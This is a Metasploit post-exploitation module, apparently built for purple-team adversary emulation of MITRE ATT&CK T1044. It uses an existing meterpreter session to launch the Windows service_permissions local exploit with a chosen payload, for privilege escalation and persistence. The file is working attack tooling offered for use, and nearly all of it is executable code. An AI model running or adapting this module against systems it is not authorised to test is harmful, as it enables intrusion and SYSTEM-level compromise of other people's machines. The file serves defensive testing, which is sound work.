##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Priv
    include Msf::Post::Windows::Accounts

    def initialize(info={})
      super(update_info(info,
                        'Name'          => 'File System Permissions Weakness (T1044) Windows - Purple Team',
                        'Description'   => %q{
                          Persistence, Privilege Escalation:
                          Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.},
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Praetorian' ],
                        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1044' ] ],
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
                       ))
      register_options(
      [
        OptString.new("MODULE", [ true, "Module to execute", 'exploit/windows/local/service_permissions'])
      ])
    end

    def run_module(mod)
        framework_mod = framework.modules.create(mod)
        payload = datastore['PAYLOAD']
        framework_mod.datastore['SESSION'] = datastore['SESSION']
        framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
        framework_mod.datastore['PAYLOAD'] = payload
        framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
        framework_mod.exploit_simple(
            'LocalInput' => self.user_input,
            'LocalOutput' => self.user_output,
            'Payload'   => payload,
            'Target'    => 0,
            'Quiet' => false,
            'RunAsJob'  => true)

        select(nil,nil,nil,2)
    end

    def run
      return 0 if session.type != "meterpreter"

      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      mod = datastore['MODULE']
      begin
          print_status("Executing '#{mod}' on #{session.inspect}")
          run_module(mod)
          print_good("Successful execution!")
      rescue ::Exception => e
          print_error("Unable to execute: #{e.message}")
          return
      end
    end
end
